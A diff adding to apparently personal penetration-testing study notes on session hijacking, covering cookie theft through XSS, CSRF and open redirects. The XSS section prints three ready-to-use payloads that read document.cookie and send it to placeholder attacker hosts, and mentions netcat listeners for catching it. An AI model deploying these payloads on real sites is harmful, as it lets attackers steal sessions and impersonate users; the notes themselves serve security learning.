@@ -56,7 +56,41 @@ The attacker takes advantage of insecure session identifiers and finds a way to 
 Below are a list of techniques that can be used to perform session hijacking.
 ##### Using [[Cross Site Scripting (XSS)]]
 
+Once an XSS vulnerability is found, it can be used to perform session related attacks.
+
+For XSS to be used to obtain session cookies:
+- The cookies should be carried in all [[HTTP]] requests.
+- The cookies should be accessible by JavaScript, that is, the `httpOnly` flag should be off.
+
+To obtain the session cookie, the JavaScript payload must interact with the `document.cookie` object, and somehow send it to the attacker.
+- This can be done manually by setting up a listener on the attacker machine.
+- Or by using tools, like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/).
+
+Some common XSS scripts to send the cookie to the attacker machine.
+```JavaScript
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http:LINK/log.php?c=' + document.cookie;"></video>
+
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
+
+- For the second script, we assume there is a `log.php` file hosted at the machine with the given IP that can read the value of the `c` query parameter that we send as the cookie.
+- Using [[netcat]] is also option, where we simply set up a listener, and the script sends a request to the listener address with the cookie as a parameter in the URL. 
+
+> After the session cookie is obtained by the attacker, the attacker now has the ability to use this session ID and impersonate the user by hijacking the user session.
+
 ##### Using [[Cross Site Request Forgery (CSRF)]]
+
+This is a technique that requires a user to interact with a malicious website that performs an action for them.
+- The users need to be logged in for the attack to work, the attack being performing an action for the user that they do not intend to do.
+
+> This can be done by making the user visit a website that we create, and this fake website performs an action like submitting a form to the actual website that they thought they were at.
+
+##### Using Open Redirects
+
+This is an attack where a website contains a vulnerability in a redirection in one of its pages.
+- If the website blindly follows the redirection URL without implementing any checks, then an attacker can control the destination.
 
 ---
 ### Session Fixation
